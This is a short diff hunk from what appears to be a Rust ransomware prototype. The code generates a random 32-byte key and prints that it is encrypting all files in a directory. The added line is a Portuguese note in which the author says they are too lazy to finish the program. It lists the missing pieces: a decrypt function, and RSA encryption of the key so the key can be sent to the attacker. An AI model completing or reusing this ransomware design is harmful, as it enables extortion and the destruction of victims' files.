@@ -16,7 +16,7 @@ fn main() {
     
     rng()
         .fill_bytes(&mut key_32_caracter);
-    
+    println!("preguica de terminar, falta criar uma funcao de desincriptar e criptografar a chave com alguma algoritima de chave publica como rsa para ser enviada para o atacante");
     println!("encrypt started");
     print!("encrypiting all files in {} ", directory_path);
 
